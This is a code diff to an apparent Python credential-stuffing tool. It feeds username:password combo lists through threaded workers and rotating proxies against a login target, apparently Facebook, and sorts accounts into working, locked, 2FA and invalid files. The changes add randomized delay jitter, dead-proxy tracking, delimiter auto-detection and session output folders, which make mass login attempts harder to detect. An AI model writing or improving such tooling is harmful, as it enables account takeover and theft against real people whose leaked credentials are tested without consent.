@@ -57,7 +57,10 @@ try:
 except ImportError:
     HAS_TQDM = False
 
-from utils.file_handler import CheckpointManager, CredentialReader, ResultWriter
+from utils.file_handler import (
+    CheckpointManager, CredentialReader, ResultWriter, SessionResultWriter,
+    auto_detect_delimiter,
+)
 from utils.checker import CheckResult, CredentialChecker, Status, TargetConfig
 from utils.proxy_manager import ProxyManager
 
@@ -128,6 +131,7 @@ def _worker(
     timeout: int,
     retries: int,
     delay: float,
+    delay_jitter: float,
     logger: logging.Logger,
     progress_bar,
 ) -> None:
@@ -145,6 +149,7 @@ def _worker(
             timeout=timeout,
             retries=retries,
             delay=delay,
+            delay_jitter=delay_jitter,
             proxies=proxies,
         )
 
@@ -318,17 +323,28 @@ def main() -> None:
         print(f"{Fore.RED}[ERROR] Input file not found: {args.input}{Style.RESET_ALL}")
         sys.exit(1)
 
-    delimiter = args.delimiter or gen.get("delimiter", ":")
+    delimiter = args.delimiter or gen.get("delimiter", "auto")
     reader = CredentialReader(args.input, delimiter=delimiter)
+    print(f"{Fore.CYAN}[INPUT] Delimiter: '{reader.delimiter}' (auto-detected){Style.RESET_ALL}")
 
     # -- Output files --------------------------------------------------------
-    writer = ResultWriter(
-        working_file=out.get("working_file", "working.txt"),
-        invalid_file=out.get("invalid_file", "invalid.txt"),
-        locked_file=out.get("locked_file", "locked.txt"),
-        twofa_file=out.get("twofa_file", "2fa.txt"),
-        error_file=out.get("error_file", "error.txt"),
-    )
+    use_session = out.get("use_session_folder", "false").lower() == "true"
+    if use_session:
+        session_base = out.get("session_base_dir", ".")
+        writer: ResultWriter = SessionResultWriter(base_dir=session_base)
+        session_dir = writer.session_dir  # type: ignore[attr-defined]
+        print(f"{Fore.CYAN}[OUTPUT] Session folder: {session_dir}{Style.RESET_ALL}")
+        working_display = os.path.join(session_dir, "working.txt")
+    else:
+        writer = ResultWriter(
+            working_file=out.get("working_file", "working.txt"),
+            invalid_file=out.get("invalid_file", "invalid.txt"),
+            locked_file=out.get("locked_file", "locked.txt"),
+            twofa_file=out.get("twofa_file", "2fa.txt"),
+            error_file=out.get("error_file", "error.txt"),
+            malformed_file=out.get("malformed_file", "malformed.txt"),
+        )
+        working_display = out.get("working_file", "working.txt")
 
     # -- Checkpoint / resume -------------------------------------------------
     checkpoint_every = int(gen.get("checkpoint_every", 500))
@@ -344,6 +360,7 @@ def main() -> None:
     # -- Proxy setup ---------------------------------------------------------
     use_proxy = False
     proxy_manager: Optional[ProxyManager] = None
+    dead_proxies_file = prx.get("dead_proxies_file", "dead_proxies.txt") or None
 
     if not args.no_proxy:
         proxy_file = args.proxies or (prx.get("proxy_file") if prx.get("enabled", "false").lower() == "true" else None)
@@ -355,6 +372,7 @@ def main() -> None:
                 test_proxies=prx.get("test_proxies", "false").lower() == "true",
                 test_url=prx.get("test_url", "https://www.facebook.com"),
                 timeout=int(gen.get("timeout", 10)),
+                dead_proxies_file=dead_proxies_file,
             )
             if proxy_manager.count == 0:
                 print(f"{Fore.RED}[WARNING] No valid proxies found – running without proxy.{Style.RESET_ALL}")
@@ -371,10 +389,11 @@ def main() -> None:
     timeout = int(gen.get("timeout", 10))
     retries = int(gen.get("retries", 2))
     delay = float(gen.get("delay", 0.5))
+    delay_jitter = float(gen.get("delay_jitter", 0.3))
 
     print(
         f"{Fore.CYAN}[CONFIG] threads={thread_count}  timeout={timeout}s  "
-        f"retries={retries}  delay={delay}s{Style.RESET_ALL}"
+        f"retries={retries}  delay={delay}s  jitter={delay_jitter}s{Style.RESET_ALL}"
     )
 
     # -- Count total lines for progress bar ----------------------------------
@@ -403,7 +422,7 @@ def main() -> None:
             target=_worker,
             args=(
                 task_queue, target, proxy_manager, writer,
-                stats, timeout, retries, delay, log, progress_bar,
+                stats, timeout, retries, delay, delay_jitter, log, progress_bar,
             ),
             daemon=True,
         )
@@ -411,8 +430,16 @@ def main() -> None:
         workers.append(t)
 
     # -- Feed credentials into queue -----------------------------------------
+    malformed_count = 0
     try:
-        for idx, (username, password) in enumerate(reader.stream(), start=1):
+        idx = 0
+        for username, password, raw_line in reader.stream_with_malformed():
+            idx += 1
+            if username is None:
+                # Malformed line – log it and skip
+                writer.write_malformed(raw_line)
+                malformed_count += 1
+                continue
             if idx <= skip:
                 continue
             task_queue.put((username, password))
@@ -447,9 +474,11 @@ def main() -> None:
 
     print(f"\n{Fore.GREEN}{'=' * 60}{Style.RESET_ALL}")
     print(f"  {stats.summary()}")
+    if malformed_count:
+        print(f"  {Fore.YELLOW}Malformed/skipped: {malformed_count}{Style.RESET_ALL}")
     print(f"  Elapsed: {elapsed:.1f}s   Speed: {speed:.1f} creds/s")
     print(f"{Fore.GREEN}{'=' * 60}{Style.RESET_ALL}\n")
-    print(f"{Fore.GREEN}[DONE] Working accounts saved to: {out.get('working_file', 'working.txt')}{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}[DONE] Working accounts saved to: {working_display}{Style.RESET_ALL}")
     log.info("Run complete. %s", stats.summary())
 
 
